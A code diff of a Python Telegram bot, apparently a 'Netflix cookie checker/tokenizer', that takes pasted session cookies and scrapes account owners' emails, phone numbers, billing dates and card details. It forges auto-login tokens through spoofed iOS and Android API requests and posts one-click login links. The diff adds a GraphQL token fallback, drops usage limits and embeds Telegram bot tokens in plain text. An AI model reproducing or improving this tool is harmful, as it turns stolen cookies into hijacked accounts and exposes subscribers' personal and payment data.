@@ -25,7 +25,7 @@ from telegram.ext import (
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # CONFIGURATION
-TELEGRAM_BOT_TOKEN = "8597687291:AAGoa2PQL6glLjyT2Tb-qH8MXRm9h_8jutc"
+TELEGRAM_BOT_TOKEN = "8803266871:AAH4rnYV5GdGHsLT6Tvwhp_ret3X4MrXjLA"
 OWNER_HANDLE = "@kudsoo"
 BOT_HANDLE = "@kudasaixddbot"
 
@@ -36,9 +36,8 @@ REQUIRED_GROUP = "@kudasaiisimpressed"
 GROUP_LINK = "https://t.me/kudasaiisimpressed"
 
 ADMIN_IDS = [8511482382]  # Your Admin Telegram ID
-FREE_CHECK_LIMIT = 5      # Limite de comptes pour les utilisateurs gratuits
 
-# Concurrency Queue Limiter (e.g., max 3 simultaneous checks to prevent rate limits)
+# Concurrency Queue Limiter
 CHECK_SEMAPHORE = asyncio.Semaphore(3)
 
 # ==================== DATABASE SETUP ====================
@@ -56,8 +55,7 @@ def init_db():
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
             username TEXT,
-            checks_count INTEGER DEFAULT 0,
-            is_premium INTEGER DEFAULT 0
+            checks_count INTEGER DEFAULT 0
         )
     """)
     conn.commit()
@@ -107,13 +105,14 @@ async def check_memberships(bot, user_id):
 
     return is_channel_joined, is_group_joined
 
-# ==================== NETFLIX SCRAPER & TOKENIZER ====================
+# ==================== NETFLIX SCRAPER & ROBUST PARSER ====================
 
 UA_WEB = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/131.0.0.0 Safari/537.36"
 )
+UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
 
 COUNTRY_FLAGS = {
     "US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹",
@@ -157,40 +156,50 @@ def _rx_all(pattern, text):
     return re.findall(pattern, text, re.S)
 
 def _flag(cc):
-    return COUNTRY_FLAGS.get((cc or "").upper(), "🏳️")
+    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")
 
 def _country(cc):
     return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")
 
-def load_cookies(text):
-    text = text.strip()
-    if text.startswith("[") or text.startswith("{"):
-        try:
-            data = json.loads(text)
-            if isinstance(data, list):
-                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
-            if isinstance(data, dict):
-                return data
-        except Exception:
-            pass
-    
+def parse_netscape(text):
     cookies = {}
     for line in text.splitlines():
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        parts = re.split(r'\s+', line, maxsplit=6)
+        # Support both tab-separated and whitespace-separated Netscape formats
+        parts = re.split(r'\s+', line)
         if len(parts) >= 7:
-            cookies[parts[5].strip()] = parts[6].strip()
-            
-    if cookies:
-        return cookies
+            cookies[parts[5]] = parts[6]
+    return cookies
 
+def parse_json_cookies(text):
+    try:
+        data = json.loads(text)
+        if isinstance(data, list):
+            return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
+        if isinstance(data, dict):
+            return data
+    except Exception:
+        pass
+    return {}
+
+def load_cookies(text):
+    text = text.strip()
+    if text.startswith("[") or text.startswith("{"):
+        c = parse_json_cookies(text)
+        if c:
+            return c
+    c = parse_netscape(text)
+    if c:
+        return c
+    cookies = {}
     for part in re.split(r"[;\n]", text):
         part = part.strip()
         if "=" in part:
             k, _, v = part.partition("=")
-            k, v = k.strip(), v.strip()
+            k = k.strip()
+            v = v.strip()
             if k:
                 cookies[k] = v
     return cookies
@@ -236,6 +245,9 @@ _IOS_HEADERS = {
     "x-netflix.client.type": "argo",
     "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
     "x-netflix.context.locales": "en-US",
+    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.client.iosversion": "15.8.5",
+    "accept-language": "en-US;q=1",
     "x-netflix.argo.abtests": "",
     "x-netflix.context.os-version": "15.8.5",
     "x-netflix.request.client.context": '{"appState":"foreground"}',
@@ -249,19 +261,63 @@ _IOS_HEADERS = {
 def generate_nftoken(netflix_id_raw, timeout=15):
     if not netflix_id_raw:
         return None
+
     netflix_id = urllib.parse.unquote(str(netflix_id_raw))
     headers = dict(_IOS_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
 
     try:
-        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False)
+        r = requests.get(
+            _IOS_API,
+            params=_IOS_PARAMS,
+            headers=headers,
+            timeout=timeout,
+            verify=False,
+        )
         if r.status_code == 200:
             data = r.json()
-            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
+            token_data = (
+                (((data.get("value") or {}).get("account") or {})
+                 .get("token") or {})
+                .get("default") or {}
+            )
+            tok = token_data.get("token")
             if tok:
                 return str(tok)
     except Exception:
         pass
+
+    try:
+        sess2 = requests.Session()
+        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
+        payload = {
+            "operationName": "CreateAutoLoginToken",
+            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
+            "extensions": {
+                "persistedQuery": {
+                    "version": 102,
+                    "id": "76e97129-f4b5-41a0-a73c-12e674896849",
+                }
+            },
+        }
+        r2 = sess2.post(
+            "https://android13.prod.ftl.netflix.com/graphql",
+            json=payload,
+            headers={
+                "User-Agent": UA_ANDROID,
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+            },
+            timeout=timeout,
+        )
+        if r2.status_code == 200:
+            d = r2.json()
+            tok = (d.get("data") or {}).get("createAutoLoginToken")
+            if tok:
+                return str(tok)
+    except Exception:
+        pass
+
     return None
 
 def check_account(cookies: dict, timeout=20):
@@ -279,7 +335,11 @@ def check_account(cookies: dict, timeout=20):
         sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
 
     try:
-        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
+        r = sess.get(
+            "https://www.netflix.com/account",
+            allow_redirects=True,
+            timeout=timeout,
+        )
     except requests.RequestException:
         return None
 
@@ -287,74 +347,110 @@ def check_account(cookies: dict, timeout=20):
         return None
 
     html = r.text
+
     if '"membershipStatus":"CURRENT_MEMBER"' not in html:
         return None
 
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
-    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html)) or _djs(_rx(r'"firstName":"([^"]+)"', html))
+
+    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
+    if not name:
+        name = _djs(_rx(r'"firstName":"([^"]+)"', html))
+
     cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
-    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
+
     since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
-    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
+    if not since:
+        ts_raw = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
+        if ts_raw and ts_raw.isdigit():
+            try:
+                since = datetime.utcfromtimestamp(int(ts_raw) / 1000).strftime("%B %Y")
+            except Exception:
+                since = "N/A"
+
+    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
+    plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
+    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
+
     q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
-    quality = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}.get(q_raw, q_raw or "N/A")
+    quality_map = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}
+    quality = quality_map.get(q_raw, q_raw or "N/A")
+
     streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
+    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
 
     _pm_start = html.find('"paymentMethods"')
     pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
-    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw) or _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw) or _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
+    if not card_brand:
+        card_brand = _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    pay_type   = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
+    if not card_last4:
+        card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+
     phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
-    phone_verified = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html) == "true"
-    extra_slots = int(_rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0") or 0)
+    pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
+    phone_verified = pv_raw == "true"
+
+    extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
+    extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
+
+    can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
     free_trial = '"isInFreeTrial":true' in html
 
     profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
-    seen, profiles_clean = set(), []
+    if not profiles:
+        profiles = [_djs(p) for p in _rx_all(
+            r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
+    seen = set()
+    profiles_clean = []
     for p in profiles:
         if p and p not in seen:
             seen.add(p)
             profiles_clean.append(p)
 
+    user_guid = _rx(r'"userGuid":"([^"]+)"', html)
     netflix_id_raw = cookies.get("NetflixId", "")
     tok = generate_nftoken(netflix_id_raw, timeout) if netflix_id_raw else None
-    
     if tok:
-        tok_safe = urllib.parse.quote(tok, safe="")
-        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
+        tok_safe    = urllib.parse.quote(tok, safe="")
+        login_pc    = f"https://netflix.com/?nftoken={tok_safe}"
         login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
     else:
-        login_pc = "https://www.netflix.com/browse"
-        login_phone = "https://www.netflix.com/browse"
-        
+        login_pc    = "N/A"
+        login_phone = "N/A"
     login_tv = "https://www.netflix.com/tv2"
 
+    display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
+
     return {
-        "email": email or "N/A",
-        "name": name or (profiles_clean[0] if profiles_clean else "N/A"),
-        "country_code": cc,
-        "country": _country(cc),
-        "plan": plan or "N/A",
-        "price": price or "N/A",
-        "member_since": since or "N/A",
-        "next_billing": nextbill or "N/A",
-        "free_trial": free_trial,
-        "video_quality": quality,
-        "max_streams": str(streams),
-        "extra_slots": extra_slots,
-        "card_brand": card_brand or "N/A",
-        "card_last4": card_last4 or "N/A",
+        "email":          email or "N/A",
+        "name":           display_name,
+        "country_code":   cc,
+        "country":        _country(cc),
+        "plan":           plan or "N/A",
+        "plan_id":        plan_id or "N/A",
+        "price":          price or "N/A",
+        "member_since":   since or "N/A",
+        "next_billing":   nextbill or "N/A",
+        "free_trial":     free_trial,
+        "can_change":     can_change,
+        "video_quality":  quality,
+        "max_streams":    str(streams),
+        "extra_slots":    extra_slots,
+        "card_brand":     card_brand or "N/A",
+        "card_last4":     card_last4 or "N/A",
         "payment_method": pay_type or "N/A",
-        "phone": phone,
+        "phone":          phone,
         "phone_verified": phone_verified,
-        "profiles": profiles_clean,
-        "profile_count": len(profiles_clean),
-        "netflix_id_raw": netflix_id_raw,
-        "login_pc": login_pc,
-        "login_phone": login_phone,
-        "login_tv": login_tv,
+        "profiles":       profiles_clean,
+        "profile_count":  len(profiles_clean),
+        "user_guid":        user_guid or "N/A",
+        "netflix_id_raw":   netflix_id_raw,
+        "login_pc":         login_pc,
+        "login_phone":      login_phone,
+        "login_tv":         login_tv,
     }
 
 # ==================== TELEGRAM BOT INTERFACE ====================
@@ -406,7 +502,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "🎉 **Welcome to Kudasai Netflix Tokenizer Bot!** 🎉\n\n"
         "Convert Netscape cookies into instant auto-login tokens for **PC**, **Phone**, and **TV**.\n\n"
-        f"➡️ **Developer:** {OWNER_HANDLE} ✅"
+        f"➡️ **Developer:** {OWNER_HANDLE}"
     )
 
     if update.message:
@@ -445,38 +541,29 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "check_prompt":
         await query.message.edit_text(
             "🍪 **Send Netflix Cookies**\n\n"
-            "Please paste your Netscape cookies or cookie text directly in the chat now:",
+            "Please paste your Netscape cookies, JSON, or cookie text directly in the chat now:",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]))
     elif data == "check_status":
-        user_data = db_query("SELECT checks_count, is_premium FROM users WHERE user_id=?", (user_id,), "one")
+        user_data = db_query("SELECT checks_count FROM users WHERE user_id=?", (user_id,), "one")
         total = user_data["checks_count"] if user_data else 0
-        is_prem = user_data["is_premium"] if user_data else 0
-        is_admin = user_id in ADMIN_IDS
-
-        if is_admin or is_prem:
-            limit_text = "♾️ Unlimited (VIP/Premium)"
-        else:
-            limit_text = f"{max(0, FREE_CHECK_LIMIT - total)} / {FREE_CHECK_LIMIT} left"
-
         total_users = len(db_query("SELECT user_id FROM users", fetch="all"))
 
         await query.message.edit_text(
             f"📊 **Your Account Status:**\n\n"
             f"🆔 Telegram ID: `{user_id}`\n"
-            f"⭐ Account Type: `{'Admin/VIP' if is_admin or is_prem else 'Free User'}`\n"
-            f"📈 Checks Performed: `{total}`\n"
-            f"⚡ Remaining Free Checks: `{limit_text}`\n"
-            f"👥 Total Bot Users: `{total_users} users`",
+            f"📈 Total Checks Performed: `{total}`\n"
+            f"👥 Total Bot Users: `{total_users} users`\n"
+            f"⚡ Queue Status: Active (Admin Bypass Enabled)",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
     elif data == "guide":
         guide_msg = (
             "📖 **User Guide:**\n\n"
-            "1. Click **Check Netflix Cookie** and paste your Netscape cookies.\n"
+            "1. Click **Check Netflix Cookie** and paste your Netscape or JSON cookies.\n"
             "2. If the server is busy, your request will enter a seamless queue.\n"
             "3. Get instant account metrics and auto-login links for **PC**, **Phone**, and **TV**!\n\n"
-            f"➡️ Owner: {OWNER_HANDLE} ✅"
+            f"➡️ Owner: {OWNER_HANDLE}"
         )
         await query.message.edit_text(guide_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
     elif data == "admin_panel":
@@ -484,11 +571,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         users_count = len(db_query("SELECT user_id FROM users", fetch="all"))
         
         await query.message.edit_text(
-            f"🛠️ **ADMIN CONTROL PANEL**\n\n"
+            f"⚙️ **ADMIN CONTROL PANEL**\n\n"
             f"👥 Total Registered Users: `{users_count}`\n"
-            f"⚙️ Free User Limit: `{FREE_CHECK_LIMIT} checks`\n\n"
-            f"💡 **To grant Premium to a user**, send the command:\n"
-            f"`/giveprem <user_id>` in chat.",
+            f"⚡ Active Semaphore Limit: `3 concurrent checks`\n"
+            f"🛡️ Status: Queue enabled, Admins bypass queue.",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]))
 
@@ -511,20 +597,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     is_admin = user.id in ADMIN_IDS
-    user_row = db_query("SELECT checks_count, is_premium FROM users WHERE user_id=?", (user.id,), "one")
-    checks_done = user_row["checks_count"] if user_row else 0
-    is_prem = user_row["is_premium"] if user_row else 0
-
-    # Vérification de la limite pour les utilisateurs gratuits
-    if not is_admin and not is_prem and checks_done >= FREE_CHECK_LIMIT:
-        await update.message.reply_text(
-            f"❌ **Free Limit Reached!**\n\n"
-            f"You have already used your free limit of `{FREE_CHECK_LIMIT}` checks.\n"
-            f"Contact {OWNER_HANDLE} to upgrade your account to Premium/VIP!",
-            parse_mode="Markdown"
-        )
-        return
-
     status_msg = await update.message.reply_text("⏳ <i>Processing cookies in queue...</i>", parse_mode="HTML")
 
     try:
@@ -551,33 +623,33 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         flag = _flag(cc)
         p = acc.get("profiles", [])
         profs = ", ".join(p[:4]) if p else "N/A"
-        pv = "✔️" if acc.get("phone_verified") else "❌"
+        pv = "✅" if acc.get("phone_verified") else "❌"
         nf_id = acc.get("netflix_id_raw", "")
 
         caption = (
-            f"✅ <b>NETFLIX ACCOUNT CHECKED</b>\n\n"
+            f"🎬 <b>NETFLIX ACCOUNT CHECKED</b>\n\n"
             f"👤 <b>{acc['name']}</b>\n"
             f"📧 <code>{acc['email']}</code>\n"
             f"🌍 {acc['country']} {flag} ({cc})\n\n"
-            f"💎 <b>{acc['plan']}</b>  •  💲 {acc['price']}\n"
+            f"📋 <b>{acc['plan']}</b>  •  💰 {acc['price']}\n"
             f"📅 Since: {acc['member_since']}\n"
-            f"💳 Billing: {acc['next_billing']}\n"
+            f"🗓 Billing: {acc['next_billing']}\n"
             f"🎁 Free Trial: {'Yes' if acc['free_trial'] else 'No'}\n\n"
-            f"📺 {acc['video_quality']}  |  👥 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
+            f"🎥 {acc['video_quality']}  |  📺 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
             f"💳 {acc['card_brand']} *{acc['card_last4']}  •  {acc['payment_method']}\n"
-            f"📱 {acc['phone']}  {pv}\n"
+            f"📞 {acc['phone']}  {pv}\n"
             f"👥 Profiles ({acc['profile_count']}): {profs}\n\n"
             f"🍪 <b>Cookie Snippet</b>\n"
             f"<code>NetflixId={nf_id[:30]}...</code>\n\n"
             f"➖➖➖➖➖➖➖➖➖➖\n"
-            f"➡️ <b>Developer:</b> {OWNER_HANDLE} ✅\n"
+            f"➡️ <b>Developer:</b> {OWNER_HANDLE}\n"
             f"🤖 <b>Bot:</b> {BOT_HANDLE}"
         )
 
         buttons = []
         row1 = []
         if acc.get("login_pc") and acc["login_pc"] != "N/A":
-            row1.append(InlineKeyboardButton("💻 Click to PC", url=acc["login_pc"]))
+            row1.append(InlineKeyboardButton("🖥 Click to PC", url=acc["login_pc"]))
         if acc.get("login_phone") and acc["login_phone"] != "N/A":
             row1.append(InlineKeyboardButton("📱 Click to Phone", url=acc["login_phone"]))
         if row1:
@@ -591,42 +663,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"[DEBUG] Checker Exception: {e}")
         await status_msg.edit_text(f"❌ <b>An error occurred:</b> <code>{str(e)}</code>", parse_mode="HTML")
 
-# Commande Admin pour donner le Premium à un utilisateur par son ID
-async def give_premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ You are not authorized to use this command.")
-        return
-
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: `/giveprem <user_id>`", parse_mode="Markdown")
-        return
-
-    try:
-        target_id = int(context.args[0])
-    except ValueError:
-        await update.message.reply_text("❌ Invalid User ID format.")
-        return
-
-    target_user = db_query("SELECT * FROM users WHERE user_id=?", (target_id,), "one")
-    if not target_user:
-        await update.message.reply_text(f"❌ User with ID `{target_id}` not found in database.", parse_mode="Markdown")
-        return
-
-    db_query("UPDATE users SET is_premium = 1 WHERE user_id=?", (target_id,))
-    await update.message.reply_text(f"✅ Success! User `{target_id}` has been upgraded to **Premium/VIP**.", parse_mode="Markdown")
-
 def main():
     app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).post_init(set_bot_commands).build()
 
     app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("giveprem", give_premium_command))
     app.add_handler(CommandHandler("stats", lambda u, c: c.bot.send_message(u.effective_chat.id, f"📊 Total Bot Users: {len(db_query('SELECT user_id FROM users', fetch='all'))}")))
     app.add_handler(CommandHandler("admin", lambda u, c: u.message.reply_text("Admin Panel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Open Admin Control", callback_data="admin_panel")]]))))
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("[+] Kudasai Keyless Netflix Bot is online with Queue & User Tracking!")
+    print("[+] Kudasai Keyless Netflix Bot is online with Advanced Checker & Queue!")
     app.run_polling()
 
 if __name__ == "__main__":
